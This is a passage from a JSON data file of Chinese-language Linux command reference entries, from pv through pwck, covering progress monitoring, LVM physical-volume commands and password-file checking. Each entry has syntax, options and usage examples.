class=\"hljs-comment\">SEC</span>    <span class=\"hljs-comment\">在SEC秒过去之前不显示任何内容</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">s</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">size</span> <span class=\"hljs-comment\">SIZE</span>          <span class=\"hljs-comment\">将估算的数据大小设置为SIZE字节</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">l</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">line</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">mode</span>          <span class=\"hljs-comment\">计算行数而不是字节数</span> \n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">0</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">null</span>               <span class=\"hljs-comment\">行以零结尾</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">i</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">interval</span> <span class=\"hljs-comment\">SEC</span>       <span class=\"hljs-comment\">每SEC秒更新一次</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">w</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">width</span> <span class=\"hljs-comment\">WIDTH</span>        <span class=\"hljs-comment\">假设终端的宽度为WIDTH个字符</span> \n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">H</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">height</span> <span class=\"hljs-comment\">HEIGHT</span>      <span class=\"hljs-comment\">假设终端高度为HEIGHT行</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">N</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">name</span> <span class=\"hljs-comment\">NAME</span>          <span class=\"hljs-comment\">在可视信息前面加上名称</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">force</span>              <span class=\"hljs-comment\">将标准错误输出到终端</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">c</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">cursor</span>             <span class=\"hljs-comment\">使用光标定位转义序列</span>\n\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">L</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">rate</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">limit</span> <span class=\"hljs-comment\">RATE</span>    <span class=\"hljs-comment\">将传输限制为每秒RATE字节</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">B</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">buffer</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">size</span> <span class=\"hljs-comment\">BYTES</span>  <span class=\"hljs-comment\">使用BYTES的缓冲区大小</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">C</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">splice</span>          <span class=\"hljs-comment\">从不使用splice()，始终使用读/写</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">E</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">skip</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">errors</span>        <span class=\"hljs-comment\">跳过输入中的读取错误</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">S</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">stop</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">at</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">size</span>       <span class=\"hljs-comment\">传输</span>--<span class=\"hljs-comment\">size字节后停止</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">R</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">remote</span> <span class=\"hljs-comment\">PID</span>         <span class=\"hljs-comment\">更新过程PID的设置</span>\n\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">P</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">pidfile</span> <span class=\"hljs-comment\">FILE</span>       <span class=\"hljs-comment\">将进程ID保存在FILE中</span> \n\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">d</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">watchfd</span> <span class=\"hljs-comment\">PID</span><span class=\"hljs-title\">[</span><span class=\"hljs-comment\">:FD</span><span class=\"hljs-title\">]</span>   <span class=\"hljs-comment\">监视进程PID</span><span class=\"hljs-string\">,</span><span class=\"hljs-comment\">打开的文件FD</span>\n\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">h</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">help</span>               <span class=\"hljs-comment\">显示帮助</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">V</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">version</span>            <span class=\"hljs-comment\">显示版本信息</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>我们（在 linux 上使用命令行的用户）的大多数使用场景都会用到的命令是从一个 USB 驱动器拷贝电影文件到你的电脑。如果你使用 cp 来完成上面的任务，你会什么情况都不清楚，直到整个复制过程结束或者出错。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 复制文件会有进度</span>\nlinux [master●] % pv ~<span class=\"hljs-regexp\">/Downloads/</span>CentOS-<span class=\"hljs-number\">7</span>-x86_64-Minimal-<span class=\"hljs-number\">1511</span>.iso &gt; ~<span class=\"hljs-regexp\">/Desktop/</span>CentOS-<span class=\"hljs-number\">7</span>-x86_64-Minimal-<span class=\"hljs-number\">1511</span>.iso\n<span class=\"hljs-comment\"># 下面输入信息</span>\n<span class=\"hljs-number\">552</span>MiB <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span> [ <span class=\"hljs-number\">212</span>MiB/s] [==================&gt;           ] <span class=\"hljs-number\">91</span>% ETA <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n\n<span class=\"hljs-comment\"># -L 可以让你修改 pv 命令的传输速率。</span>\n<span class=\"hljs-comment\"># 使用 -L 选项来限制传输速率为2MB/s。</span>\npv -L <span class=\"hljs-number\">2</span>m <span class=\"hljs-regexp\">/media/</span>himanshu<span class=\"hljs-regexp\">/1AC2-A8E3/</span>fNf.mkv &gt; .<span class=\"hljs-regexp\">/Desktop/</span>fnf.mkv \n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 字符一个个匀速在命令行中显示出来</span>\necho <span class=\"hljs-string\">\"Tecmint[dot]com is a community of Linux Nerds and Geeks\"</span> | pv -qL <span class=\"hljs-number\">10</span>\n\n<span class=\"hljs-comment\"># 压缩文件展示进度信息</span>\npv <span class=\"hljs-regexp\">/media/</span>himanshu<span class=\"hljs-regexp\">/1AC2-A8E3/</span>fnf.mkv | gzip &gt; .<span class=\"hljs-regexp\">/Desktop/</span>fnf.log.gz \n\n\n<span class=\"hljs-comment\"># 用 dd 命令将 iso 写入磁盘，pv来实现进度条的显示</span>\nsudo pv -cN source &lt; <span class=\"hljs-regexp\">/Users/</span>kacperwang<span class=\"hljs-regexp\">/Downloads/</span>CentOS-<span class=\"hljs-number\">7</span>-x86_64-Everything-<span class=\"hljs-number\">1511</span>.iso | sudo dd of=<span class=\"hljs-regexp\">/dev/</span>disk2 bs=<span class=\"hljs-number\">4</span>m\n<span class=\"hljs-comment\">## 显示下面进度</span>\nsource:  <span class=\"hljs-number\">5.2</span>GiB <span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">41</span> [ <span class=\"hljs-number\">503</span>KiB/s] [=====================&gt;       ] <span class=\"hljs-number\">71</span>% ETA <span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">56</span>\n</code></pre>\n<p>在linux上, 如果执行的一些命令或者一些脚本需要花费很长时间, 但又不能拿出更多的精力反复盯着有没有执行结束, 这时候可以用pv监听PID, 任务完成后通过网络通知到微信或者钉钉, 这样就可以腾出来精力做其他的事, 是不是很棒</p>\n<pre><code class=\"language-shell\">$ pv -d <span class=\"hljs-constructor\">$(<span class=\"hljs-params\">ps</span> -<span class=\"hljs-params\">ef</span> | <span class=\"hljs-params\">grep</span> -<span class=\"hljs-params\">v</span> <span class=\"hljs-params\">grep</span> | <span class=\"hljs-params\">grep</span> <span class=\"hljs-string\">\"&lt;脚本或命令的关键字&gt;\"</span> | <span class=\"hljs-params\">awk</span> '{<span class=\"hljs-params\">print</span> $2}')</span><span class=\"hljs-operator\"> &amp;&amp; </span>&lt;这里执行发通知脚本或者命令,脚本或命令需要提前调试好&gt;\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>选项\"-d, --watchfd PID[:FD]\", 是在1.6.6版本中才有的参数,如果使用需要<code>pv</code>升级到大于等于1.6.6的版本</li>\n<li>CentOS7的Yum仓库里<code>pv</code>最新的是1.4.6版本,1.6.6版本是发布在CentOS8里面的,如果需要,可以将CentOS8里的pv下载到本地电脑上或者本地的Yum私服里, 这个是<a href=\"http://www.rpmfind.net/linux/rpm2html/search.php?query=pv&amp;submit=Search+...&amp;system=EPEL&amp;arch=\">下载地址</a>, 可以根据自己不同的架构下载, 1.6.6的安装: <code>rpm -ivh pv-1.6.6-7.el8.x86_64.rpm -U</code></li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvchange",
        "des": "修改物理卷属性",
        "body": "<h1 id=\"pvchange\">pvchange</h1>\n<p>修改物理卷属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvchange命令</strong> 允许管理员改变物理卷的分配许可。如果物理卷出现故障，可以使用pvchange命令禁止分配物理卷上的PE。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvchange</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-u：生成新的UUID；</span>\n<span class=\"hljs-deletion\">-x：是否允许分配PE。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：指定要修改属性的物理卷所对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvchange命令禁止分配指定物理卷上的PE。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">pvchange -x n <span class=\"hljs-regexp\">/dev/</span>sdb1     <span class=\"hljs-comment\">#禁止分配\"/dev/sdb1\"上的PE</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">Physical volume <span class=\"hljs-string\">\"/dev/sdb1\"</span> <span class=\"hljs-section\">changed</span>  \n<span class=\"hljs-number\">1</span> physical volume <span class=\"hljs-section\">changed</span> / <span class=\"hljs-number\">0</span> physical volumes not <span class=\"hljs-section\">changed</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvck",
        "des": "检测物理卷的LVM元数据的一致性",
        "body": "<h1 id=\"pvck\">pvck</h1>\n<p>检测物理卷的LVM元数据的一致性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvck命令</strong> 用来检测物理卷的LVM元数据的一致性。默认情况下，物理卷中的前4个扇区保存着LVM卷标，可以使用<code>--labelsector</code>选项指定其他的位置（例如：数据恢复时）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvck</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：调试模式；</span>\n<span class=\"hljs-deletion\">-v：详细信息模式；</span>\n<span class=\"hljs-deletion\">--labelsector：指定LVE卷标所在扇区。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：指定要检查的物理卷对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvck命令检查物理卷<code>/dev/sdb1</code>。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">pvck -v /dev/sdb1    #检查物理卷元数据\nScanning /dev/sdb1  \nFound label on /dev/sdb1, sector 1, <span class=\"hljs-attribute\">type</span>=LVM2 001  \nFound text metadata area: <span class=\"hljs-attribute\">offset</span>=4096, <span class=\"hljs-attribute\">size</span>=192512 \nFound LVM2 metadata record at <span class=\"hljs-attribute\">offset</span>=125952,  \n<span class=\"hljs-attribute\">size</span>=70656, <span class=\"hljs-attribute\">offset2</span>=0 <span class=\"hljs-attribute\">size2</span>=0\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvcreate",
        "des": "将物理硬盘分区初始化为物理卷",
        "body": "<h1 id=\"pvcreate\">pvcreate</h1>\n<p>将物理硬盘分区初始化为物理卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvcreate命令</strong> 用于将物理硬盘分区初始化为物理卷，以便LVM使用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvcreate</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：强制创建物理卷，不需要用户确认；</span>\n<span class=\"hljs-deletion\">-u：指定设备的UUID；</span>\n<span class=\"hljs-deletion\">-y：所有的问题都回答“yes”；</span>\n<span class=\"hljs-deletion\">-Z：是否利用前4个扇区。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：指定要创建的物理卷对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查看磁盘信息：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># fdisk -l</span>\nDisk /dev/hda: 41.1 GB,<span class=\"hljs-number\"> 41174138880 </span>bytes\n255 heads,<span class=\"hljs-number\"> 63 </span>sectors/track,<span class=\"hljs-number\"> 5005 </span>cylinders\nUnits = cylinders of<span class=\"hljs-number\"> 16065 </span>*<span class=\"hljs-number\"> 512 </span>=<span class=\"hljs-number\"> 8225280 </span>bytes\n\n   Device Boot      Start         End      Blocks   id  System\n/dev/hda1   *          <span class=\"hljs-number\"> 1 </span>        <span class=\"hljs-number\"> 13 </span>    <span class=\"hljs-number\"> 104391 </span> <span class=\"hljs-number\"> 83 </span> Linux\n/dev/hda2             <span class=\"hljs-number\"> 14 </span>      <span class=\"hljs-number\"> 1288 </span>   10241437+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/hda3           <span class=\"hljs-number\"> 1289 </span>      <span class=\"hljs-number\"> 1925 </span>    5116702+ <span class=\"hljs-number\"> 83 </span> Linux\n/dev/hda4           <span class=\"hljs-number\"> 1926 </span>      <span class=\"hljs-number\"> 5005 </span>  <span class=\"hljs-number\"> 24740100 </span>  <span class=\"hljs-number\"> 5 </span> Extended\n/dev/hda5           <span class=\"hljs-number\"> 1926 </span>      <span class=\"hljs-number\"> 2052 </span>   <span class=\"hljs-number\"> 1020096 </span> <span class=\"hljs-number\"> 82 </span> Linux swap / Solaris\n/dev/hda6           <span class=\"hljs-number\"> 2053 </span>      <span class=\"hljs-number\"> 2235 </span>   <span class=\"hljs-number\"> 1469916 </span>  8e  Linux LVM\n/dev/hda7           <span class=\"hljs-number\"> 2236 </span>      <span class=\"hljs-number\"> 2418 </span>   <span class=\"hljs-number\"> 1469916 </span>  8e  Linux LVM\n/dev/hda8           <span class=\"hljs-number\"> 2419 </span>      <span class=\"hljs-number\"> 2601 </span>   <span class=\"hljs-number\"> 1469916 </span>  8e  Linux LVM\n/dev/hda9           <span class=\"hljs-number\"> 2602 </span>      <span class=\"hljs-number\"> 2784 </span>   <span class=\"hljs-number\"> 1469916 </span>  8e  Linux LVM\n</code></pre>\n<p>检查有无 PV 在系统上，然后将<code>/dev/hda6</code>到<code>/dev/hda9</code>建立成为PV格式</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># pvscan</span>\nNo matching physical volumes found    <span class=\"hljs-meta\">#找不到任何的 PV 存在！</span>\n</code></pre>\n<p>将6-9分区转成pv，注意大括号的用途：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># pvcreate /dev/hda{6,7,8,9}</span>\n  Physical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"/dev/hda6\"</span> successfully created</span>\n  Physical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"/dev/hda7\"</span> successfully created</span>\n  Physical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"/dev/hda8\"</span> successfully created</span>\n  Physical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"/dev/hda9\"</span> successfully created</span>\n</code></pre>\n<p>这就分別表示每个 PV 的信息与系统所有 PV 的信息：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># pvscan</span>\n  PV <span class=\"hljs-regexp\">/dev/</span>hda6         lvm2 [<span class=\"hljs-number\">1.40</span> GB]\n  PV <span class=\"hljs-regexp\">/dev/</span>hda7         lvm2 [<span class=\"hljs-number\">1.40</span> GB]\n  PV <span class=\"hljs-regexp\">/dev/</span>hda8         lvm2 [<span class=\"hljs-number\">1.40</span> GB]\n  PV <span class=\"hljs-regexp\">/dev/</span>hda9         lvm2 [<span class=\"hljs-number\">1.40</span> GB]\n  Total: <span class=\"hljs-number\">4</span> [<span class=\"hljs-number\">5.61</span> GB] <span class=\"hljs-regexp\">/ in use: 0 [0   ] /</span> <span class=\"hljs-keyword\">in</span> no VG: <span class=\"hljs-number\">4</span> [<span class=\"hljs-number\">5.61</span> GB]\n</code></pre>\n<p>更详细的列示出系统上面每个 PV 信息：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# pvdisplay\n  <span class=\"hljs-string\">\"/dev/hda6\"</span> is a new physical volume of <span class=\"hljs-string\">\"1.40 GB\"</span>\n  --- NEW Physical volume ---\n  PV <span class=\"hljs-keyword\">Name</span>               /dev/hda6  #实际的 partition 分区名称\n  VG <span class=\"hljs-keyword\">Name</span>                          #因为尚未分配出去，所以空白！\n  PV <span class=\"hljs-built_in\">Size</span>               <span class=\"hljs-number\">1.40</span> GB    #就是容量说明\n  <span class=\"hljs-keyword\">Allocatable</span>           NO         #是否已被分配，结果是 NO\n  PE <span class=\"hljs-built_in\">Size</span> (KByte)       <span class=\"hljs-number\">0</span>          #在此 PV 內的 PE 大小\n  Total PE              <span class=\"hljs-number\">0</span>          #共分割出几个 PE\n  <span class=\"hljs-keyword\">free</span> PE               <span class=\"hljs-number\">0</span>          #沒被 LV 用掉的 PE\n  <span class=\"hljs-built_in\">Allocated</span> PE          <span class=\"hljs-number\">0</span>          #尚可分配出去的 PE 数量\n  PV UUID               Z13Jk5-RCls-UJ8B-HzDa-Gesn-atku-rf2biN\n....(底下省略)....\n</code></pre>\n<p>删除物理卷：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># pvremove /dev/sdb2</span>\nLabels <span class=\"hljs-literal\">on</span> physical volume <span class=\"hljs-string\">\"/dev/sdb2\"</span> successfully wiped\n</code></pre>\n<p>修改物理卷属性：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># pvchange -x n /dev/sdb1    #禁止分配指定物理卷上的PE</span>\nPhysical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> <span class=\"hljs-string\">\"/dev/sdb1\"</span> changed  </span>\n<span class=\"hljs-number\">1</span> physical <span class=\"hljs-keyword\">volume</span><span class=\"language-bash\"> changed / 0 physical volumes not changed </span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvdisplay",
        "des": "显示物理卷的属性",
        "body": "<h1 id=\"pvdisplay\">pvdisplay</h1>\n<p>显示物理卷的属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvdisplay命令</strong> 用于显示物理卷的属性。pvdisplay命令显示的物理卷信息包括：物理卷名称、所属的卷组、物理卷大小、PE大小、总PE数、可用PE数、已分配的PE数和UUID。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvdisplay</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：以短格式输出；</span>\n<span class=\"hljs-deletion\">-m：显示PE到LE的映射。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：要显示的物理卷对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvdisplay命令显示指定的物理卷的基本信息。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># pvdisplay /dev/sdb1    #显示物理卷基本信息</span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">\"/dev/sdb1\"</span> is a new physical volume of <span class=\"hljs-string\">\"101.94 MB\"</span>  \n<span class=\"hljs-params\">---</span> NEW Physical volume <span class=\"hljs-params\">---</span>  \nPV Name               <span class=\"hljs-string\">/dev/sdb1</span>  \n<span class=\"hljs-string\">....</span>省略部分输出内容<span class=\"hljs-string\">......</span>  \nPV UUID         FOXiS2-Ghaj-Z0Mf- <span class=\"hljs-keyword\">cd</span>VZ-pfpk- dP9p-ifIZXN\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvremove",
        "des": "删除一个存在的物理卷",
        "body": "<h1 id=\"pvremove\">pvremove</h1>\n<p>删除一个存在的物理卷</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvremove命令</strong> 用于删除一个存在的物理卷。使用pvremove指令删除物理卷时，它将LVM分区上的物理卷信息删除，使其不再被视为一个物理卷。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvremove</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>d <span class=\"hljs-comment\"># 调试模式；</span>\n<span class=\"hljs-literal\">-</span>f <span class=\"hljs-comment\"># 强制删除；</span>\n<span class=\"hljs-literal\">-</span>y <span class=\"hljs-comment\"># 对提问回答“yes”。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：指定要删除的物理卷对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvremove指令删除物理卷<code>/dev/sdb2</code>。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">pvremove <span class=\"hljs-regexp\">/dev/</span>sdb2 <span class=\"hljs-comment\"># 删除物理卷</span>\nLabels&nbsp;on&nbsp;physical&nbsp;volume&nbsp;<span class=\"hljs-string\">\"/dev/sdb2\"</span>&nbsp;successfully&nbsp;wiped\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvs",
        "des": "输出物理卷信息报表",
        "body": "<h1 id=\"pvs\">pvs</h1>\n<p>输出物理卷信息报表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvs命令</strong> 用于输出格式化的物理卷信息报表。使用pvs命令仅能得到物理卷的概要信息，如果要得到更加详细的信息可以使用pvdisplay命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--noheadings：不输出标题头；</span>\n<span class=\"hljs-comment\">--nosuffix：不输出空间大小的单位。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>物理卷：要显示报表的物理卷列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvs命令显示系统中所有物理卷的信息报表。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pvs</span> <span class=\"hljs-comment\"># 输出物理卷信息报表 </span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">PV         VG     fmt  Attr PSize   PFree  \n<span class=\"hljs-regexp\">/dev/</span>sdb1  vg1000 lvm2 --   <span class=\"hljs-number\">100.00</span>M <span class=\"hljs-number\">100.00</span>M  \n<span class=\"hljs-regexp\">/dev/</span>sdb2         lvm2 --   <span class=\"hljs-number\">101.98</span>M <span class=\"hljs-number\">101.98</span>M\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pvscan",
        "des": "扫描系统中所有硬盘的物理卷列表",
        "body": "<h1 id=\"pvscan\">pvscan</h1>\n<p>扫描系统中所有硬盘的物理卷列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pvscan命令</strong> 会扫描系统中连接的所有硬盘，列出找到的物理卷列表。使用pvscan命令的<code>-n</code>选项可以显示硬盘中的不属于任何卷组的物理卷，这些物理卷是未被使用的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pvscan</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：调试模式；</span>\n<span class=\"hljs-deletion\">-e：仅显示属于输出卷组的物理卷；</span>\n<span class=\"hljs-deletion\">-n：仅显示不属于任何卷组的物理卷；</span>\n<span class=\"hljs-deletion\">-s：短格式输出；</span>\n<span class=\"hljs-deletion\">-u：显示UUID。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用pvscan命令扫描当前系统中所有硬盘的物理卷，在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># pvscan     #扫描所有硬盘上的物理卷 </span>\n</code></pre>\n<p>输出信息如下：</p>\n<pre><code class=\"language-shell\">PV <span class=\"hljs-regexp\">/dev/</span>sdb1         lvm2 [<span class=\"hljs-number\">101.94</span> MB]  \nPV <span class=\"hljs-regexp\">/dev/</span>sdb2         lvm2 [<span class=\"hljs-number\">101.98</span> MB]  \nTotal: <span class=\"hljs-number\">2</span> [<span class=\"hljs-number\">203.92</span> MB] <span class=\"hljs-regexp\">/ in use: 0 [0   ] /</span> <span class=\"hljs-keyword\">in</span> no VG: <span class=\"hljs-number\">2</span> [<span class=\"hljs-number\">203.92</span>  \nMB] \n</code></pre>\n<p>说明：本例中，输出了两个物理卷，它们不属于任何卷组，是可被利用的物理卷。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pwck",
        "des": "用来验证系统认证文件内容和格式的完整性",
        "body": "<h1 id=\"pwck\">pwck</h1>\n<p>用来验证系统认证文件内容和格式的完整性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pwck命令</strong> 用来验证系统认证文件<code>/etc/passwd</code>和<code>/etc/shadow</code>的内容和格式的完整性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pwck</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-q：仅报告错误信息；\n-s：以用户id排序文件“<span class=\"hljs-regexp\">/etc/</span>passwd”和“<span class=\"hljs-regexp\">/etc/</span>shadow”;\n-r：只读方式运行指令。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  密码文件：指定密码文件的路径；</li>\n<li>  影子文件：指定影子文件的路径。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">pwck /etc/passwd<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'lp'</span>: directory <span class=\"hljs-string\">'/var/spool/lpd'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'news'</span>: directory <span class=\"hljs-string\">'/var/spool/news'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'uucp'</span>: directory <span class=\"hljs-string\">'/var/spool/uucp'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'www-data'</span>: directory <span class=\"hljs-string\">'/var/www'</span> does 